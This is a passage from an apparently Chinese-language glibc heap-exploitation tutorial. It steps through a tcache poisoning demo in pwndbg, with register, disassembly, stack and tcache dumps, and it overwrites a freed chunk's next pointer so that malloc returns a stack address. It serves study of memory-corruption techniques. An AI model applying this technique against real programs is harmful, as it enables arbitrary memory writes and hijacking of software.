<span class="mi">0x0000555555554815</span>  <span class="mi">18</span>      <span class="no">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
<span class="na">......</span>
 <span class="nf">RDI</span>  <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="na">......</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554815</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">187</span><span class="p">)</span> <span class="err">?—</span> <span class="no">call</span>   <span class="mi">0x555555554600</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="na">......</span>
 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">187</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>
        <span class="nl">ptr:</span> <span class="err">0</span><span class="nf">x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="na">......</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
<span class="na">......</span>
 <span class="err">?</span> <span class="err">18</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
<span class="na">......</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="na">......</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">ni</span>
<span class="err">20</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x0</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x7</span>
 <span class="nf">RDX</span>  <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x1</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0x100000000000000</span>
 <span class="nf">R8</span>   <span class="mi">0x0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x1c00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x911</span>
 <span class="nf">R11</span>  <span class="mi">0x7ffff7aa0ba0</span> <span class="p">(</span><span class="no">free</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">rbx</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x55555555481a</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">192</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x20083f</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x555555554802</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">168</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2bd</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554809</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">175</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fwrite@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554630</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x55555555480e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">180</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554812</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">184</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">187</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x55555555481a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">192</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x20083f</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554821</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">199</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554825</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">203</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2b4</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555482c</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">210</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x55555555482f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">213</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554834</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">218</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">15</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">a</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">16</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">17</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Freeing</span> <span class="no">the</span> <span class="no">buffer...</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">18</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">19</span> 
 <span class="err">?</span> <span class="err">20</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c1">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c1">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapbase</span>
<span class="nf">heapbase</span> <span class="p">:</span> <span class="mi">0x555555756000</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="p">*(</span><span class="no">struct</span> <span class="no">tcache_perthread_struct</span><span class="p">*)</span><span class="mi">0x555555756010</span>
<span class="nf">$3</span> <span class="err">=</span> <span class="err">{</span>
  <span class="nf">counts</span> <span class="err">=</span> <span class="err">&quot;\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">001</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&#39;\</span><span class="mi">000</span><span class="err">&#39;</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">55</span> <span class="no">times</span><span class="err">&gt;</span><span class="p">,</span>
  <span class="nf">entries</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x555555756260</span><span class="p">,</span> <span class="mi">0x0</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">56</span> <span class="no">times</span><span class="err">&gt;}</span>
<span class="err">}</span>
</code></pre></div>
可以看到，此时第 8 条 tcache 链上已经有了一个 chunk，从 <code>tcache_prethread_struct</code> 结构体中也能得到同样的结论 </p>
<p>然后修改 tcache 的 next
<div class="highlight"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> 
<span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="mi">8</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="mi">0x555555756260</span>
<span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="mi">0x7fffffffdfa8</span><span class="p">).</span>
<span class="err">23</span>      <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x85</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x7ffff7dd48b0</span> <span class="p">(</span><span class="no">_IO_stdfile_2_lock</span><span class="p">)</span> <span class="err">?—</span> <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x0</span>
 <span class="nf">RSI</span>  <span class="mi">0x7fffffffb900</span> <span class="err">?—</span> <span class="mi">0x777265766f206557</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">We</span> <span class="no">overw</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x8500000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554867</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">269</span><span class="p">)</span> <span class="err">?—</span> <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554867</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">269</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x7ffff7dd48b0</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x55555555486b</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">273</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555486f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">277</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="no">rdx</span>
   <span class="err">0</span><span class="nf">x555555554872</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">280</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
   <span class="err">0</span><span class="nf">x555555554877</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">285</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">malloc@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554620</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x55555555487c</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">290</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x55555555487f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">293</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007da</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554886</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">300</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2eb</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555488d</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">307</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554890</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">310</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554895</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">315</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">18</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">19</span> 
   <span class="err">20</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
 <span class="err">?</span> <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c1">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c1">;</span>
   <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">27</span> 
   <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c1">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
